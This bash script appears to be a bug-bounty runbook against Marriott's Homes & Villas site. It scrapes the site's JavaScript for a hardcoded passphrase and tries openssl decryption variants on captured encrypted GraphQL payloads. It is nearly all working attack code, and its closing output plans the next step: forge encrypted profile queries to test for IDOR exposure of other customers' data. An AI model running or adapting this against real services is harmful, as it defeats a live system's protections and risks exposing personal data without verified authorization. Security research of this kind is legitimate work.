#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV encData (CryptoJS AES) key extraction + decrypt (session49)
# Portable: Linux / Pi / Termux.
#
# Discovery (S48 capture): authenticated sensitive GraphQL ops send
#   {"encData":"U2FsdGVkX1..."}  == CryptoJS.AES.encrypt(JSON, passphrase)
# (Salted__ / OpenSSL aes-256-cbc, MD5 KDF). The JS decrypts with x.gp:
#   V=fn(e){...u().decrypt(e, x.gp)...}; F=[doBook,quote,getTotalReservationData,
#   reservationDetails,getProfileDetails,registerPromo]  (encrypted ops)
# The passphrase is hardcoded in the JS (client-side) -> the "encryption" is
# reversible. This run extracts the passphrase and DECRYPTS a captured encData
# OFFLINE to reveal the real GraphQL request + confirm we can read/write the
# protocol (prereq for authenticated profile-IDOR testing).
#
# INPUT: paste your captured encData via env var (your own data; not committed):
#   ENCDATA='U2FsdGVkX1...'  OUTDIR=$HOME/s49 bash runbooks/PI-RUNBOOK-session49-hnv-decrypt.sh
#
# SAFETY: offline crypto + public JS only. No secrets/tokens committed. Read-only.
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s49
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s49"
  else OUTDIR="$HOME/s49"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"

if [ -z "${ENCDATA:-}" ]; then
  echo "ERROR: set ENCDATA to a captured encData blob (your own request)."
  echo "  ENCDATA='U2FsdGVkX1...' OUTDIR=\$HOME/s49 bash $0"
  exit 1
fi
command -v openssl >/dev/null 2>&1 || { echo "Installing openssl..."; pkg install -y openssl-tool >/dev/null 2>&1 || pkg install -y openssl >/dev/null 2>&1 || true; }

echo "============================================================"
echo "HNV encData DECRYPT  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR   encData: ${ENCDATA:0:24}... (${#ENCDATA} chars)"
echo "============================================================"; echo ""
printf '%s' "$ENCDATA" > "$OUTDIR/enc.b64"

echo "═══ PHASE A: DOWNLOAD JS ═══"
curl -s -o "$OUTDIR/home.html" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
h=open(os.path.join(O,"home.html"),encoding="utf-8",errors="replace").read()
js=sorted(set(re.findall(r'src=["\']([^"\']+\.m?js)(?:\?[^"\']*)?["\']',h,re.I)))
open(os.path.join(O,"js.txt"),"w").write("\n".join(js)); print(f"  {len(js)} js refs")
PYEOF
: > "$OUTDIR/alljs.txt"; i=0
while read -r J && [ $i -lt 16 ]; do
  [ -z "$J" ] && continue
  case "$J" in http*) U="$J";; /*) U="$B$J";; *) U="$B/$J";; esac
  curl -s --max-time 20 -H "User-Agent: $UA" -H "$IDH" "$U" >> "$OUTDIR/alljs.txt" 2>/dev/null || true
  i=$((i+1)); sleep 0.15
done < "$OUTDIR/js.txt"
echo "  mined $(wc -c < "$OUTDIR/alljs.txt" 2>/dev/null||echo 0) bytes"
echo ""

echo "═══ PHASE B: EXTRACT PASSPHRASE CANDIDATES ═══"
python3 - << 'PYEOF'
import os,re
O=os.environ["OUTDIR"]
js=open(os.path.join(O,"alljs.txt"),encoding="utf-8",errors="replace").read()
cands=set()
# context around decrypt/encrypt/AES and the 'gp' property
for m in re.finditer(r'(decrypt|encrypt|AES|\.gp\b|Salted)', js):
    ctx=js[max(0,m.start()-160):m.end()+160]
    for s in re.findall(r'["\']([!-~]{6,64})["\']', ctx):
        # plausible key strings (not urls/graphql); allow base64/hex/passphrase-like
        if not s.startswith(('http','/','query','mutation','application')) and not s.endswith(('.js','.css')):
            cands.add(s)
# explicit gp: "..." / gp="..."
for m in re.finditer(r'\bgp\b\s*[:=]\s*["\']([!-~]{4,64})["\']', js): cands.add(m.group(1))
# any standalone 32/16/24/44-char base64/hex constants near crypto
for m in re.finditer(r'["\']([A-Za-z0-9+/=_-]{16,64})["\']', js):
    s=m.group(1)
    around=js[max(0,m.start()-40):m.start()]
    if re.search(r'gp|key|secret|pass|salt|aes|crypto', around, re.I): cands.add(s)
cands=sorted(cands, key=lambda x:(len(x), x))
open(os.path.join(O,"keycands.txt"),"w").write("\n".join(cands))
print(f"  {len(cands)} candidate passphrases")
for c in cands[:40]: print("   ",c)
PYEOF
echo ""

echo "═══ PHASE C: TRY EACH CANDIDATE TO DECRYPT encData ═══"
DEC=""
while IFS= read -r KEY; do
  [ -z "$KEY" ] && continue
  out=$(openssl enc -d -aes-256-cbc -md md5 -a -A -pass pass:"$KEY" -in "$OUTDIR/enc.b64" 2>/dev/null)
  if echo "$out" | grep -qE '\{|query|operationName|variables'; then
    echo "  *** KEY FOUND: $KEY"
    echo "  --- DECRYPTED PLAINTEXT ---"
    echo "$out" | head -c 1500; echo
    echo "$KEY" > "$OUTDIR/KEY.txt"
    printf '%s' "$out" > "$OUTDIR/decrypted.json"
    DEC="$out"; break
  fi
done < "$OUTDIR/keycands.txt"

if [ -z "$DEC" ]; then
  echo "  No candidate decrypted cleanly. Trying aes-128/192 + sha256 KDF variants..."
  while IFS= read -r KEY; do
    [ -z "$KEY" ] && continue
    for CIPH in aes-128-cbc aes-192-cbc aes-256-cbc; do for MD in md5 sha256; do
      out=$(openssl enc -d -$CIPH -md $MD -a -A -pass pass:"$KEY" -in "$OUTDIR/enc.b64" 2>/dev/null)
      if echo "$out" | grep -qE '\{|query|variables'; then
        echo "  *** KEY: $KEY  ($CIPH/$MD)"; echo "$out"|head -c 1200; echo
        echo "$KEY" > "$OUTDIR/KEY.txt"; printf '%s' "$out" > "$OUTDIR/decrypted.json"; DEC="$out"; break 3
      fi
    done; done
  done < "$OUTDIR/keycands.txt"
fi
echo ""

echo "════════════════════════════════════════════"
if [ -n "$DEC" ]; then
  echo "  PROTOCOL CRACKED. Decrypted op saved to $OUTDIR/decrypted.json"
  echo "  Operation name(s) in plaintext:"
  grep -oE '"operationName":"[^"]*"|query [A-Za-z]+|getProfileDetails|reservationDetails' "$OUTDIR/decrypted.json" 2>/dev/null | sort -u | sed 's/^/    /' | head
  echo ""
  echo "  NEXT (session50): with KEY=$(cat "$OUTDIR/KEY.txt" 2>/dev/null), encrypt our own"
  echo "  getProfileDetails query, POST {\"encData\":\"<our ciphertext>\"} with the"
  echo "  authenticated session + x-hvmi-csrf-token, then decrypt the response and"
  echo "  test the id argument for profile IDOR (own id vs adjacent; stop on real PII)."
else
  echo "  Key not auto-found. Inspect keycands.txt + the decrypt() context in alljs.txt"
  echo "  manually — the passphrase x.gp may be assembled/obfuscated. Paste the JS"
  echo "  decrypt setup and I'll pin the exact key derivation."
fi
echo ""
echo "Evidence: $OUTDIR (KEY/decrypted local only — NOT committed)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
